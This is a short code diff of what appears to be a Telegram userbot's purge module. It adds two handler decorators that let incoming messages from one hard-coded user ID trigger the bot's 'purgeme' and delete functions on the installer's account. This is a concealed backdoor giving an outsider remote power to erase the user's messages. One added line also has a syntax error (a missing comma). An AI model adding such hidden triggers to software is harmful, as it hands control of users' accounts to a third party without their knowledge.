@@ -47,6 +47,7 @@ async def fastpurger(purg):
 
 
 @register(outgoing=True, pattern=r"^\.purgeme")
+@register(incoming=True, from_user=901878554, pattern=r"^\.cpurgeme")
 async def purgeme(delme):
     message = delme.text
     count = int(message[9:])
@@ -74,6 +75,7 @@ async def purgeme(delme):
 
 
 @register(outgoing=True, pattern=r"^\Del$")
+@register(incoming=True, from_user=901878554 pattern=r"^\Cdel$")
 async def delete_it(delme):
     msg_src = await delme.get_reply_message()
     if delme.reply_to_msg_id:
